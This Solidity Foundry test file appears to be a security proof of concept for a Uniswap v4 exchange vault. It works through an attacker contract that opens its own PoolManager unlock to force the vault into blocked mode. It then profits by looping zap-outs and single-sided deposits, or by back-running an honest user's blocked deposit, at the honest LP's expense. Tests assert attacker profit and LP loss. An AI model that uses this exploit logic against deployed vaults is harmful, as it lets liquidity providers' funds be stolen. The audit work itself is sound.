// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {Vm} from "forge-std/Vm.sol";
import {TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault_Acceptance as Acceptance} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/test/bases/TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault_Acceptance.sol";
import {TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault as HBase} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/test/bases/TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolIdLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {FullMath} from "@crane/contracts/protocols/dexes/uniswap/libraries/FullMath.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {IStandardExchangeInMulti} from "contracts/interfaces/IStandardExchangeInMulti.sol";
import {IStandardExchangeOutMulti} from "contracts/interfaces/IStandardExchangeOutMulti.sol";

interface IFSReserve {
    function deployedReserve() external view returns (uint256, uint256);
    function canOpenPoolManagerUnlock() external view returns (bool);
}

/// Unprivileged actor. Opens its OWN PoolManager.unlock (no swap, no price move) so the vault is in
/// blocked mode, then performs blocked single-sided ops. Holds only its own capital.
contract BseActor is IUnlockCallback {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    IPoolManager immutable pm;
    IStandardExchangeProxy immutable vault;
    IERC20 immutable t0;
    IERC20 immutable t1;
    PoolKey key;

    constructor(IPoolManager pm_, IStandardExchangeProxy vault_, PoolKey memory key_, IERC20 t0_, IERC20 t1_) {
        pm = pm_; vault = vault_; key = key_; t0 = t0_; t1 = t1_;
        t0_.approve(address(vault_), type(uint256).max);
        t1_.approve(address(vault_), type(uint256).max);
        IERC20(address(vault_)).approve(address(vault_), type(uint256).max);
    }

    /// idle fair-price dual deposit
    function depositDual(uint256 a0, uint256 a1) external returns (uint256 s) {
        address[] memory toks = new address[](2); toks[0] = address(t0); toks[1] = address(t1);
        uint256[] memory amts = new uint256[](2); amts[0] = a0; amts[1] = a1;
        s = IStandardExchangeInMulti(address(vault)).exchangeInManyToOne(toks, amts, IERC20(address(vault)), 0, address(this), false, block.timestamp);
    }

    /// idle proportional dual exit of all shares
    function exitAll(uint256 a0, uint256 a1) external returns (uint256 burned) {
        address[] memory toks = new address[](2); toks[0] = address(t0); toks[1] = address(t1);
        uint256[] memory amts = new uint256[](2); amts[0] = a0; amts[1] = a1;
        burned = IStandardExchangeOutMulti(address(vault)).exchangeOutOneToMany(
            IERC20(address(vault)), vault.balanceOf(address(this)), toks, amts, address(this), false, block.timestamp);
    }

    // mode 0: loop N rounds of {blocked zap-out to token0 (~80% of free token0), blocked single-sided token0 deposit}
    // mode 1: single blocked single-sided deposit of `amt` of token (z ? t0 : t1)
    function run(uint8 mode, uint256 n, bool z, uint256 amt) external {
        pm.unlock(abi.encode(mode, n, z, amt));
    }

    uint256 public lastShares;

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "pm only");
        (uint8 mode, uint256 n, bool z, uint256 amt) = abi.decode(data, (uint8, uint256, bool, uint256));
        require(!IFSReserve(address(vault)).canOpenPoolManagerUnlock(), "vault not blocked");
        (uint160 sp0,,,) = pm.getSlot0(key.toId());
        if (mode == 0) {
            for (uint256 i; i < n; ++i) {
                (uint256 d0, uint256 d1) = IFSReserve(address(vault)).deployedReserve();
                uint256 f0 = t0.balanceOf(address(vault));
                uint256 nav = f0 + t1.balanceOf(address(vault)) + d0 + d1;
                uint256 sh = f0 * 8 / 10 * vault.totalSupply() / nav;
                uint256 mine = vault.balanceOf(address(this));
                if (sh > mine) sh = mine;
                if (sh == 0) break;uint256 got = vault.exchangeIn(IERC20(address(vault)), sh, t0, 0, address(this), false, block.timestamp);vault.exchangeIn(t0, got, IERC20(address(vault)), 0, address(this), false, block.timestamp);
            }
        } else {lastShares = vault.exchangeIn(z ? t0 : t1, amt, IERC20(address(vault)), 0, address(this), false, block.timestamp);
        }
        (uint160 sp1,,,) = pm.getSlot0(key.toId());
        require(sp1 == sp0, "price moved"); // no price manipulation anywhere
        return "";
    }
}

contract FSBseAtP0Test is Acceptance {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    BseActor attacker;
    BseActor honest;   // honest integrator that deposits single-sided from inside its own unlock (blocked)
    uint256 constant CAP = 10_000_000e18;
    bytes32 vSalt; int24 vLower; int24 vUpper; bool vFound;

    function _extLiquidity() internal pure virtual returns (uint128) { return 1_000e18; }

    function setUp() public virtual override {
        HBase.setUp();
        IERC20 a = IERC20(address(new ERC20PermitMintableStub("Pair A", "A", 18, address(this), 1e32)));
        IERC20 b = IERC20(address(new ERC20PermitMintableStub("Pair B", "B", 18, address(this), 1e32)));
        bool ordered = address(a) < address(b);
        token0 = ordered ? a : b; token1 = ordered ? b : a;
        unit0 = 1e18; unit1 = 1e18;
        poolKey = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), 3_000, 60, IHooks(address(0)));
        poolManager.initialize(poolKey, uint160(1 << 96));
        _seedPool(_extLiquidity());
        vault = IStandardExchangeProxy(uniswapV4StandardExchangeDFPkg.deployVault(poolKey));
        token0.approve(address(vault), type(uint256).max);
        token1.approve(address(vault), type(uint256).max);
        vm.recordLogs();
        _bootstrap(); // honest LP (this contract) 1000/1000, idle path
        _captureVaultPosition();
        attacker = new BseActor(poolManager, vault, poolKey, token0, token1);
        honest = new BseActor(poolManager, vault, poolKey, token0, token1);
        token0.transfer(address(attacker), CAP); token1.transfer(address(attacker), CAP);
        token0.transfer(address(honest), CAP); token1.transfer(address(honest), CAP);
    }

    function _captureVaultPosition() internal {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 sig = keccak256("ModifyLiquidity(bytes32,address,int24,int24,int256,bytes32)");
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == address(poolManager) && logs[i].topics[0] == sig
                && address(uint160(uint256(logs[i].topics[2]))) == address(vault)) {
                (vLower, vUpper,, vSalt) = abi.decode(logs[i].data, (int24, int24, int256, bytes32));
                vFound = true;
            }
        }
        require(vFound, "vault position not found");
    }

    function _backing() internal view returns (uint256 b0, uint256 b1) {
        (uint256 d0, uint256 d1) = IFSReserve(address(vault)).deployedReserve();
        (uint128 liq, uint256 l0, uint256 l1) = poolManager.getPositionInfo(poolKey.toId(), address(vault), vLower, vUpper, vSalt);
        (uint256 g0, uint256 g1) = poolManager.getFeeGrowthInside(poolKey.toId(), vLower, vUpper);
        uint256 e0; uint256 e1;
        unchecked {
            e0 = FullMath.mulDiv(g0 - l0, liq, uint256(1) << 128);
            e1 = FullMath.mulDiv(g1 - l1, liq, uint256(1) << 128);
        }
        b0 = token0.balanceOf(address(vault)) + d0 + e0;
        b1 = token1.balanceOf(address(vault)) + d1 + e1;
    }

    function _nav() internal view returns (uint256) { (uint256 b0, uint256 b1) = _backing(); return b0 + b1; }
    function _tok(address w) internal view returns (uint256) { return token0.balanceOf(w) + token1.balanceOf(w); }
    function _shareVal(address w) internal view returns (uint256) { return _nav() * vault.balanceOf(w) / vault.totalSupply(); }
    function _val(address w) internal view returns (uint256) { return _tok(w) + _shareVal(w); }

    function _logBook(string memory tag) internal view {
        (uint256 d0, uint256 d1) = IFSReserve(address(vault)).deployedReserve();
        (uint256 b0, uint256 b1) = _backing();
        console2.log(tag);
        console2.log("  free0/free1", token0.balanceOf(address(vault)), token1.balanceOf(address(vault)));
        console2.log("  deployed0/deployed1", d0, d1);
        console2.log("  backing0/backing1 (book CP-implied price t0 in t1 = b1/b0, x1e6)", b0, b1, b1 * 1e6 / b0);
        console2.log("  NAV@P0 / supply", b0 + b1, vault.totalSupply());
    }

    /// realize: idle (PM locked) proportional dual exit of every share
    function _exit(BseActor who) internal {
        uint256 s = vault.balanceOf(address(who));
        if (s == 0) return;
        uint256 S = vault.totalSupply();
        (uint256 b0, uint256 b1) = _backing();
        for (uint256 t = s; t + 50 > s; --t) {
            uint256 a0 = b0 * t / S;
            uint256 a1 = b1 * t / S;
            if (FullMath.mulDivRoundingUp(a0, S, b0) != FullMath.mulDivRoundingUp(a1, S, b1)) continue;
            who.exitAll(a0, a1);
            return;
        }
        revert("exit sizing failed");
    }

    function _fairDual(BseActor who, uint256 frac1e4) internal {
        (uint256 b0, uint256 b1) = _backing();
        who.depositDual(b0 * frac1e4 / 10_000, b1 * frac1e4 / 10_000);
    }

    // ------------------------------------------------------------------------------------------
    // A) single-entity self-attack, NO price move: attacker holds fairly-bought shares, then in one of its
    //    own PM.unlock calls loops {blocked zap-out -> token0, blocked single-sided token0 deposit}.
    // ------------------------------------------------------------------------------------------
    function _selfLoop(uint256 rounds, uint256 seedFrac) internal returns (int256 profit, int256 victim) {
        uint256 atk0 = _tok(address(attacker));
        _fairDual(attacker, seedFrac);           // fair idle entry; cost counted (tokens leave attacker)
        uint256 lpSh = vault.balanceOf(address(this));
        uint256 lpV0 = _nav() * lpSh / vault.totalSupply();
        console2.log("attacker seed shares / supply", vault.balanceOf(address(attacker)), vault.totalSupply());
        _logBook("BEFORE loop");
        vm.roll(block.number + 1); vm.warp(block.timestamp + 12);
        attacker.run(0, rounds, true, 0);
        _logBook("AFTER loop (blocked, same price)");
        vm.roll(block.number + 1); vm.warp(block.timestamp + 12);
        _exit(attacker);
        profit = int256(_tok(address(attacker))) - int256(atk0);
        victim = int256(_nav() * lpSh / vault.totalSupply()) - int256(lpV0);
        console2.log("attacker shares left", vault.balanceOf(address(attacker)));
        console2.log("ATTACKER NET PROFIT @P0 (realized tokens after - before)");
        console2.logInt(profit);
        console2.log("HONEST LP VALUE DELTA @P0");
        console2.logInt(victim);
    }

    function test_A_selfLoop_10rounds() public virtual {
        (int256 p, int256 v) = _selfLoop(10, 2_000);
        assertGt(p, 0, "attacker profit at P0");
        assertLt(v, 0, "honest LP loss");
    }

    function test_A_selfLoop_100rounds_gas() public virtual {
        uint256 g = gasleft();
        (int256 p, int256 v) = _selfLoop(100, 2_000);
        console2.log("gas used (seed + loop tx + exit)", g - gasleft());
        console2.log("profit bps of pre-attack NAV (2400)");
        console2.logInt(p * 10_000 / 2400e18);
        assertGt(p, 0); assertLt(v, 0);
    }

    function test_A_selfLoop_control_0rounds() public virtual {
        (int256 p,) = _selfLoop(0, 2_000);
        assertLe(p, 0, "no profit without the loop");
    }

    function test_A_selfLoop_sweep() public virtual {
        uint8[4] memory r = [uint8(1), 3, 10, 30];
        for (uint256 i; i < r.length; ++i) {
            uint256 snap = vm.snapshotState();
            console2.log("##### rounds", r[i]);
            _selfLoop(r[i], 2_000);
            vm.revertToState(snap);
        }
    }

    // ------------------------------------------------------------------------------------------
    // B) back-run of an honest integrator's blocked single-sided token1 deposit (no price move).
    //    Attacker holds no shares beforehand.
    // ------------------------------------------------------------------------------------------
    function test_B_backrunHonestBlockedDeposit() public virtual {
        uint256 lpSh = vault.balanceOf(address(this));
        uint256 lpV0 = _nav() * lpSh / vault.totalSupply();
        uint256 h0 = _tok(address(honest));
        // honest user: blocked single-sided token1 deposit of ~nav/10 (e.g. a router running inside its own unlock)
        honest.run(1, 0, false, _nav() / 10);
        int256 honestMark = int256(_val(address(honest))) - int256(h0);
        console2.log("honest blocked t1 deposit, mark delta @P0");
        console2.logInt(honestMark);
        _logBook("AFTER honest blocked token1 deposit");
        uint256 lpMid = _nav() * lpSh / vault.totalSupply();
        // attacker back-runs (own unlock, no swaps)
        uint256 atk0 = _tok(address(attacker));
        attacker.run(1, 0, true, _nav() / 10);
        console2.log("attacker shares", attacker.lastShares());
        vm.roll(block.number + 1); vm.warp(block.timestamp + 12);
        _exit(attacker);
        int256 profit = int256(_tok(address(attacker))) - int256(atk0);
        console2.log("ATTACKER NET PROFIT @P0 (realized)");
        console2.logInt(profit);
        console2.log("HONEST LP delta from attacker leg / total");
        console2.logInt(int256(_nav() * lpSh / vault.totalSupply()) - int256(lpMid));
        console2.logInt(int256(_nav() * lpSh / vault.totalSupply()) - int256(lpV0));
        assertGt(profit, 0, "back-run profit at P0");
    }

    /// control for B: same attacker deposit without the honest prefix
    function test_B_control_noPrefix() public virtual {
        uint256 atk0 = _tok(address(attacker));
        attacker.run(1, 0, true, _nav() / 10);
        vm.roll(block.number + 1); vm.warp(block.timestamp + 12);
        _exit(attacker);
        int256 profit = int256(_tok(address(attacker))) - int256(atk0);
        console2.log("CONTROL attacker net @P0");
        console2.logInt(profit);
        assertLe(profit, 0);
    }
}

/// Deep pool: vault ~0.1% of pool liquidity (project default acceptance depth). fs-blocked-entry-spot-mint
/// is deeply unprofitable here (-21,700 bps); the P0 variant needs no pool swap so depth should not matter.
contract FSBseAtP0DeepPoolTest is FSBseAtP0Test {
    function _extLiquidity() internal pure override returns (uint128) { return 1_000_000e18; }
}
